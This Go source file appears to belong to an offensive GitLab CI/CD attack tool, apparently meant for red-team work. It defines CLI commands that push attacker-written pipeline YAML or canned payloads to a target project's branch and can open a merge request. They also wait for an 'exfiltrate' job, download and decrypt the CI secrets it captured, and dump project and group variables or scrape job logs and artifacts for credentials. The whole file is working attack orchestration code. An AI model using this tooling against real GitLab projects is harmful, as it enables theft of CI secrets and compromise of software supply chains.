package cmd

import (
	"context"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	rorpkg "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/mr-pmillz/gogatoz/pkg/store"
	"github.com/spf13/cobra"
)

func readOptionalKeyFile(path, flagName string) ([]byte, error) {
	p := strings.TrimSpace(path)
	if p == "" {
		return nil, nil
	}
	b, err := os.ReadFile(p)
	if err != nil {
		return nil, fmt.Errorf("read --%s: %w", flagName, err)
	}
	return b, nil
}

type artifactExfilResult struct {
	secrets    map[string]string
	pipelineID int64
	jobID      int64
	status     string
	url        string
}

func waitArtifactExfil(ctx context.Context, w io.Writer, client *gitlabx.Client, target, branch, jobName, baseURL string, privkeyPEM []byte) artifactExfilResult {
	var res artifactExfilResult
	renderInfo(w, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
	res.pipelineID, res.jobID, res.status, _ = attack.WaitForExfilPipeline(ctx, client, target, branch, jobName, 5*time.Second, atkWaitTimeout)
	if res.pipelineID > 0 {
		res.url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(baseURL, "/"), target, res.pipelineID)
	}
	switch res.status {
	case "success":
		res.secrets = downloadAndDecryptArtifacts(ctx, w, client, target, res.jobID, privkeyPEM)
	case "":
		renderWarning(w, "exfiltrate job not found or timed out")
	default:
		renderWarning(w, fmt.Sprintf("exfiltrate job status: %s", res.status))
	}
	return res
}

func downloadAndDecryptArtifacts(ctx context.Context, w io.Writer, client *gitlabx.Client, target string, jobID int64, privkeyPEM []byte) map[string]string {
	zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, target, jobID)
	if zerr != nil {
		renderWarning(w, fmt.Sprintf("artifact download failed: %v", zerr))
		return nil
	}
	sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
	if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
		secrets, err := secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
		if err != nil {
			renderWarning(w, fmt.Sprintf("decrypt failed: %v", err))
			return nil
		}
		return secrets
	}
	if len(sJSON) > 0 {
		var secrets map[string]string
		_ = json.Unmarshal(sJSON, &secrets)
		return secrets
	}
	return nil
}

func collectSecretsDumpData(ctx context.Context, client *gitlabx.Client, target string, out *secretsOutput) error {
	if atkWithProjVars {
		pv, err := secdump.ListProjectVariables(ctx, client, target, atkIncludeProtected)
		if err != nil {
			return fmt.Errorf("list project variables: %w", err)
		}
		out.ProjectVariables = pv
	}
	if atkWithGroupVars {
		gid := strings.TrimSpace(atkGroupID)
		if gid == "" {
			return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
		}
		gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
		if err != nil {
			return fmt.Errorf("list group variables: %w", err)
		}
		out.GroupVariables = gv
	}
	if atkLogs {
		finds, _ := secdump.ScrapeJobLogs(ctx, client, target, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
		if len(finds) > 0 {
			out.LogFindings = finds
		}
	}
	if atkArtifacts {
		afinds, _ := secdump.ScrapeArtifacts(ctx, client, target, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
		if len(afinds) > 0 {
			out.ArtifactFindings = afinds
		}
	}
	return nil
}

func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	pubkeyBytes, err := readOptionalKeyFile(atkPubkeyFile, "pubkey-file")
	if err != nil {
		return err
	}
	privkeyPEM, err := readOptionalKeyFile(atkPrivkeyFile, "privkey-file")
	if err != nil {
		return err
	}

	if atkAutoEncrypt && len(pubkeyBytes) == 0 {
		var genErr error
		pubkeyBytes, privkeyPEM, genErr = generateAndStoreKeyPair()
		if genErr != nil {
			return genErr
		}
	}
	sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
	url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, string(pubkeyBytes), tags, exfil)
	if err != nil {
		return err
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

	var (
		exfilSecrets map[string]string
		exfilJobID   int64
		exfilStatus  string
		pipelineID   int64
	)
	exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
	if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
		progressW := cmd.OutOrStdout()
		if outputJSON {
			progressW = cmd.ErrOrStderr()
		}
		baseURL := strings.TrimSpace(gitlabURL)
		res := waitArtifactExfil(ctx, progressW, client, atkTarget, atkBranch, exfilJobNameUsed, baseURL, privkeyPEM)
		exfilSecrets = res.secrets
		exfilJobID = res.jobID
		exfilStatus = res.status
		pipelineID = res.pipelineID
		if res.url != "" {
			url = res.url
		}
		if len(exfilSecrets) > 0 {
			renderExfilSecrets(progressW, exfilSecrets, atkAllVars)
			persistAttackExfil(baseURL, atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
		}
	}

	if outputJSON {
		out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
		if err := collectSecretsDumpData(ctx, client, atkTarget, &out); err != nil {
			return err
		}
		b, err := json.MarshalIndent(out, "", "  ")
		if err != nil {
			return fmt.Errorf("encode json: %w", err)
		}
		_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s", url))
	return nil
}

func countCISources() int {
	sources := 0
	if strings.TrimSpace(atkCIInline) != "" {
		sources++
	}
	if strings.TrimSpace(atkCIFile) != "" {
		sources++
	}
	if atkCIStdin {
		sources++
	}
	if strings.TrimSpace(atkPayload) != "" {
		sources++
	}
	return sources
}

func autoDiscoverRorTags(ctx context.Context, client *gitlabx.Client) {
	lp := strings.ToLower(strings.TrimSpace(atkPayload))
	if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
		tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
		if derr != nil {
			return
		}
		if strings.TrimSpace(atkExecutor) != "" {
			tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
		}
		if len(tags) > 0 {
			atkTags = strings.Join(tags, ",")
		}
	}
}

func resolveCIContent() (string, error) {
	var ci string
	var err error
	if strings.TrimSpace(atkPayload) != "" {
		ci, err = renderPayload()
	} else {
		ci, err = loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
	}
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(ci) == "" {
		return "", errors.New("empty CI content")
	}
	return ci, nil
}

func commitCIAndTrackPipeline(ctx context.Context, client *gitlabx.Client, ci string) (url, finalBranch string, pipelineID int64, err error) {
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, err = ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if err != nil {
		return "", "", 0, err
	}
	att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	url, err = att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
	if err != nil {
		return "", "", 0, err
	}
	stalePipelineID, _ := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 500*time.Millisecond, 5*time.Second)
	pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, stalePipelineID, 2*time.Second, 30*time.Second)
	if waitErr == nil && pipelineID > 0 {
		url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
	} else if stalePipelineID > 0 {
		url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, stalePipelineID)
	}
	return url, finalBranch, pipelineID, nil
}

func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if countCISources() != 1 {
		return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
	}
	if strings.TrimSpace(atkPayload) != "" {
		autoDiscoverRorTags(ctx, client)
	}
	ci, err := resolveCIContent()
	if err != nil {
		return err
	}

	url, finalBranch, pipelineID, err := commitCIAndTrackPipeline(ctx, client, ci)
	if err != nil {
		return err
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

	var mrURL string
	var mrIID int64
	if atkCreateMR {
		realAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
		mr, mrErr := realAtt.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
		if mrErr != nil {
			return fmt.Errorf("create merge request: %w", mrErr)
		}
		mrURL = mr.WebURL
		mrIID = mr.IID
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
	}

	if outputJSON {
		out := struct {
			PipelineURL     string `json:"pipeline_url"`
			Branch          string `json:"branch"`
			PipelineID      int64  `json:"pipeline_id"`
			MergeRequestURL string `json:"merge_request_url,omitempty"`
			MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
		}{
			PipelineURL:     url,
			Branch:          finalBranch,
			PipelineID:      pipelineID,
			MergeRequestURL: mrURL,
			MergeRequestIID: mrIID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s (branch %s)", url, finalBranch))
	if mrURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
	}
	return nil
}

// generateAndStoreKeyPair creates an RSA-4096 keypair for auto-encrypt mode,
// returns the PEM-encoded public and private keys, and persists the pair to
// the CLI store if available.
func generateAndStoreKeyPair() (pubPEMBytes, privPEMBytes []byte, err error) {
	slog.Info("auto-encrypt: generating RSA-4096 keypair")
	privKey, pubPEM, err := pivot.GenerateKeyPair(4096)
	if err != nil {
		return nil, nil, fmt.Errorf("auto-encrypt keygen: %w", err)
	}
	privDER, err := x509.MarshalPKCS8PrivateKey(privKey)
	if err != nil {
		return nil, nil, fmt.Errorf("auto-encrypt marshal: %w", err)
	}
	privPEMBytes = pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: privDER})

	if cliStore != nil {
		label := "auto-" + time.Now().UTC().Format(time.RFC3339)
		if storeErr := cliStore.SaveKeyPair(&store.KeyPair{
			Label:      label,
			PublicPEM:  pubPEM,
			PrivatePEM: string(privPEMBytes),
			KeyBits:    4096,
		}); storeErr != nil {
			slog.Warn("auto-encrypt: failed to persist keypair", "error", storeErr)
		} else {
			slog.Info("auto-encrypt: keypair stored in DB", "label", label)
		}
	}
	return []byte(pubPEM), privPEMBytes, nil
}
